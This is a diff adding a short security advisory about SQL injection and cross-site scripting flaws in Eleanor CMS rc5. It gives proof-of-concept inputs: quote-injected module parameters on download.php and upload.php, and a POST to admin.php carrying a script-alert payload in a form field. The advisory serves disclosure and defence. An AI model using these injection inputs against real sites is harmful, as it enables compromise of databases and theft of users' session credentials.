@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/47164/info
+
+Eleanor CMS is prone to a cross-site scripting vulnerability and multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Eleanor CMS rc5 is vulnerable; other versions may also be affected. 
+
+SQL injection:
+
+http://www.example.com/download.php?module=1%27
+http://www.example.com/upload.php?module=1%27
+
+Cross-site scripting:
+
+POST /admin.php HTTP/1.1
+
+user_name=111&pass=222&whereform="><script>alert("XSS");</script>&submit=%C2%EE%E9%F2%E8
